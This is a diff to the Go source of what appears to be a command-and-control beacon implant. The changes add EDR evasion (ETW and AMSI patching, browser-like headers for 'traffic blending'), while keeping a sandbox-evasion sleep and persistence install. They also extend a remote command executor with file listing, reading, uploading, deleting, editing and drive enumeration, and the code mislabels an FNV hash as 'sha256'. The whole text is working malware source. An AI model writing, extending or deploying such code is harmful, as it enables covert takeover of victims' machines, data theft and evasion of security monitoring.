@@ -2,12 +2,12 @@ package main
 
 import (
 	"bytes"
-	"crypto/rand"
 	"encoding/base64"
-	"encoding/hex"
 	"encoding/json"
+	"fmt"
+	"hash/fnv"
 	"io"
-	mrand "math/rand"
+	"math/rand"
 	"net"
 	"os"
 	"os/exec"
@@ -63,7 +63,9 @@ type TCPMsg struct {
 	Data json.RawMessage `json:"data,omitempty"`
 }
 
-// ==================== RAW HTTP (replaces net/http, saves ~4MB) ====================
+// ══════════════════════════════════════════════════════════
+//  Raw HTTP Client (replaces net/http, saves ~4MB)
+// ══════════════════════════════════════════════════════════
 
 // parseURL extracts host:port and path from a URL string
 func parseURL(raw string) (hostPort, path string) {
@@ -98,14 +100,16 @@ func httpDo(method, url string, headers [][2]string, body []byte) ([]byte, error
 	defer conn.Close()
 	conn.SetDeadline(time.Now().Add(15 * time.Second))
 
-	// Build raw HTTP request
+	// Build raw HTTP request with browser-like headers for traffic blending
 	var buf bytes.Buffer
 	buf.WriteString(method)
 	buf.WriteString(" ")
 	buf.WriteString(path)
 	buf.WriteString(" HTTP/1.1\r\nHost: ")
 	buf.WriteString(hostPort)
-	buf.WriteString("\r\n")
+	buf.WriteString("\r\nUser-Agent: ")
+	buf.WriteString(obfuscatedUserAgent())
+	buf.WriteString("\r\nAccept: */*\r\n")
 	for _, h := range headers {
 		buf.WriteString(h[0])
 		buf.WriteString(": ")
@@ -146,7 +150,9 @@ func httpPost(url string, body []byte) ([]byte, error) {
 	return httpDo("POST", url, nil, body)
 }
 
-// ==================== HOST INFO (replaces os/user with env vars) ====================
+// ══════════════════════════════════════════════════════════
+//  Host Information
+// ══════════════════════════════════════════════════════════
 
 func collectHostInfo(sleepSec, jitterPct int) CheckInData {
 	info := CheckInData{
@@ -205,7 +211,7 @@ func checkAdmin() bool {
 	return os.Getuid() == 0
 }
 
-// ==================== IP FILTER ====================
+// ── IP Filter ───────────────────────────────────────────
 
 func checkIPFilter() bool {
 	if ALLOWED_IPS == "" && BLOCKED_IPS == "" {
@@ -268,9 +274,14 @@ func matchIPFilter(ip net.IP, entry string) bool {
 	return ip.Equal(net.ParseIP(entry))
 }
 
-// ==================== MAIN ====================
+// ══════════════════════════════════════════════════════════
+//  Entry Point
+// ══════════════════════════════════════════════════════════
 
 func main() {
+	// Evasion: patch ETW + AMSI before any suspicious activity
+	initEvasion()
+
 	// Sleep before any operation to evade sandbox time-acceleration
 	time.Sleep(10 * time.Second)
 
@@ -283,9 +294,8 @@ func main() {
 	}
 
 	if BEACON_ID == "" {
-		b := make([]byte, 16)
-		rand.Read(b)
-		BEACON_ID = hex.EncodeToString(b)
+		r := rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(os.Getpid())))
+		BEACON_ID = fmt.Sprintf("%016x%016x", r.Int63(), r.Int63())
 	}
 
 	installPersistence()
@@ -306,7 +316,7 @@ func main() {
 	}
 }
 
-// ==================== HTTP MODE ====================
+// ── HTTP Mode ───────────────────────────────────────────
 
 func runHTTP(sleepSec, jitterPct int) {
 	register(sleepSec, jitterPct)
@@ -399,7 +409,7 @@ func sendResult(taskID, output string) {
 	httpPost(C2_URL+"/checkin", jsonData)
 }
 
-// ==================== TCP MODE ====================
+// ── TCP Mode ────────────────────────────────────────────
 
 func tcpWriteMsg(conn net.Conn, msg interface{}) error {
 	data, err := json.Marshal(msg)
@@ -527,14 +537,14 @@ func runTCP(sleepSec, jitterPct int) {
 	}
 }
 
-// ==================== SHARED ====================
+// ── Shared Utilities ────────────────────────────────────
 
 func sleepWithJitter(sleepSec, jitterPct int) {
 	jitterMs := int(float64(sleepSec*1000) * (float64(jitterPct) / 100.0))
 	if jitterMs <= 0 {
 		jitterMs = 1
 	}
-	sleepTime := time.Duration(sleepSec)*time.Second + time.Duration(mrand.Intn(jitterMs*2)-jitterMs)*time.Millisecond
+	sleepTime := time.Duration(sleepSec)*time.Second + time.Duration(rand.Intn(jitterMs*2)-jitterMs)*time.Millisecond
 	if sleepTime < time.Second {
 		sleepTime = time.Second
 	}
@@ -542,7 +552,8 @@ func sleepWithJitter(sleepSec, jitterPct int) {
 }
 
 func executeCommand(cmdStr string) string {
-	cmdLower := strings.ToLower(strings.TrimSpace(cmdStr))
+	cmdStr = strings.TrimSpace(cmdStr)
+	cmdLower := strings.ToLower(cmdStr)
 
 	// cd command
 	if strings.HasPrefix(cmdLower, "cd ") {
@@ -597,12 +608,21 @@ func executeCommand(cmdStr string) string {
 		}
 	}
 
-	// File operations
+	// File operations - must match BEFORE shell execution to prevent internal commands
+	// from being passed to powershell/sh
 	if strings.HasPrefix(cmdStr, "__FILELIST__ ") {
 		return fileList(strings.TrimSpace(cmdStr[13:]))
 	}
 	if strings.HasPrefix(cmdStr, "__FILEREAD__ ") {
 		return fileRead(strings.TrimSpace(cmdStr[13:]))
+	}
+	if strings.HasPrefix(cmdStr, "__FILEEDIT__ ") {
+		rest := strings.TrimSpace(cmdStr[13:])
+		parts := strings.SplitN(rest, "||", 3)
+		if len(parts) != 3 {
+			return jsonError("usage: __FILEEDIT__ <path>||<sha256>||<base64data>")
+		}
+		return fileEdit(parts[0], parts[1], parts[2])
 	}
 	if strings.HasPrefix(cmdStr, "__FILEUPLOAD__ ") {
 		rest := strings.TrimSpace(cmdStr[15:])
@@ -618,10 +638,18 @@ func executeCommand(cmdStr string) string {
 	if strings.HasPrefix(cmdStr, "__DELETE__ ") {
 		return fileDelete(strings.TrimSpace(cmdStr[10:]))
 	}
+	if cmdStr == "__DRIVES__" {
+		return listDrives()
+	}
 
 	// Screenshot
 	if cmdStr == "__SCREENSHOT__" {
 		return captureScreenshot()
+	}
+
+	// Any other internal commands starting with __ should not leak to shell
+	if strings.HasPrefix(cmdStr, "__") && strings.Contains(cmdStr, "__") {
+		return jsonError("UNKNOWN_INTERNAL_COMMAND: " + strings.SplitN(cmdStr, " ", 2)[0])
 	}
 
 	// Execute via shell
@@ -640,7 +668,9 @@ func executeCommand(cmdStr string) string {
 	return string(out)
 }
 
-// ==================== FILE OPERATIONS ====================
+// ══════════════════════════════════════════════════════════
+//  File Operations
+// ══════════════════════════════════════════════════════════
 
 type FileEntry struct {
 	Name    string `json:"name"`
@@ -713,6 +743,20 @@ func listDrives() string {
 	return string(data)
 }
 
+func computeFileHash(filePath string) (string, error) {
+	f, err := os.Open(filePath)
+	if err != nil {
+		return "", err
+	}
+	defer f.Close()
+
+	h := fnv.New128a()
+	if _, err := io.Copy(h, f); err != nil {
+		return "", err
+	}
+	return fmt.Sprintf("%x", h.Sum(nil)), nil
+}
+
 func fileRead(filePath string) string {
 	absPath, err := filepath.Abs(filePath)
 	if err != nil {
@@ -733,13 +777,116 @@ func fileRead(filePath string) string {
 		return jsonError(err.Error())
 	}
 
+	sha, _ := computeFileHash(absPath)
+
 	result := map[string]interface{}{
 		"path":   absPath,
 		"size":   info.Size(),
+		"sha256": sha,
 		"base64": base64.StdEncoding.EncodeToString(data),
 	}
 	out, _ := json.Marshal(result)
 	return string(out)
+}
+
+func isTextFile(fileName string) bool {
+	ext := strings.ToLower(filepath.Ext(fileName))
+	textExts := map[string]bool{
+		".txt": true, ".php": true, ".js": true, ".py": true,
+		".html": true, ".css": true, ".json": true, ".sh": true,
+		".ps1": true, ".go": true, ".bat": true, ".ini": true,
+		".conf": true, ".cfg": true, ".yaml": true, ".yml": true,
+		".md": true, ".log": true, ".xml": true,
+		".c": true, ".cpp": true, ".h": true, ".hpp": true,
+		".java": true, ".rs": true, ".toml": true, ".env": true,
+		".sql": true, ".csv": true, ".tsv": true, ".properties": true,
+		".htaccess": true, ".gitignore": true, ".dockerignore": true,
+		".dockerfile": true, ".makefile": true, ".cmake": true,
+		".ts": true, ".jsx": true, ".tsx": true, ".vue": true,
+		".rb": true, ".pl": true, ".lua": true, ".r": true,
+		".swift": true, ".kt": true, ".scala": true, ".gradle": true,
+		".tf": true, ".hcl": true, ".proto": true,
+	}
+	return textExts[ext]
+}
+
+func fileEdit(filePath, originalSHA, b64Data string) string {
+	absPath, err := filepath.Abs(filePath)
+	if err != nil {
+		return jsonError("ABS_FAILED: " + err.Error())
+	}
+
+	realPath, err := filepath.EvalSymlinks(absPath)
+	if err != nil {
+		if os.IsNotExist(err) {
+			return jsonError("FILE_NOT_FOUND")
+		}
+		return jsonError("REALPATH_FAILED: " + err.Error())
+	}
+
+	info, err := os.Stat(realPath)
+	if err != nil {
+		return jsonError("STAT_FAILED: " + err.Error())
+	}
+
+	if info.IsDir() {
+		return jsonError("NOT_A_FILE")
+	}
+
+	if info.Size() > 2*1024*1024 {
+		return jsonError("FILE_TOO_LARGE")
+	}
+
+	if !isTextFile(filepath.Base(realPath)) {
+		return jsonError("NOT_A_TEXT_FILE")
+	}
+
+	// Check writable permissions
+	fCheck, err := os.OpenFile(realPath, os.O_WRONLY, 0666)
+	if err != nil {
+		if os.IsPermission(err) {
+			return jsonError("PERMISSION_DENIED")
+		}
+		return jsonError("OPEN_FAILED: " + err.Error())
+	}
+	fCheck.Close()
+
+	currentSHA, err := computeFileHash(realPath)
+	if err != nil {
+		return jsonError("HASH_FAILED: " + err.Error())
+	}
+
+	// Skip conflict check when originalSHA is empty (new file or first edit)
+	if originalSHA != "" && currentSHA != originalSHA {
+		// Provide current_sha256 in error
+		errData, _ := json.Marshal(map[string]string{
+			"error":          "CONFLICT",
+			"current_sha256": currentSHA,
+		})
+		return string(errData)
+	}
+
+	data, err := base64.StdEncoding.DecodeString(b64Data)
+	if err != nil {
+		return jsonError("DECODE_FAILED: " + err.Error())
+	}
+
+	tempFile := realPath + ".tmp"
+	if err := os.WriteFile(tempFile, data, 0644); err != nil {
+		return jsonError("WRITE_FAILED: " + err.Error())
+	}
+
+	if err := os.Rename(tempFile, realPath); err != nil {
+		os.Remove(tempFile)
+		return jsonError("RENAME_FAILED: " + err.Error())
+	}
+
+	newSHA, _ := computeFileHash(realPath)
+
+	return jsonOK(map[string]interface{}{
+		"path":       realPath,
+		"new_sha256": newSHA,
+	})
 }
 
 func fileUpload(filePath, b64Data string) string {
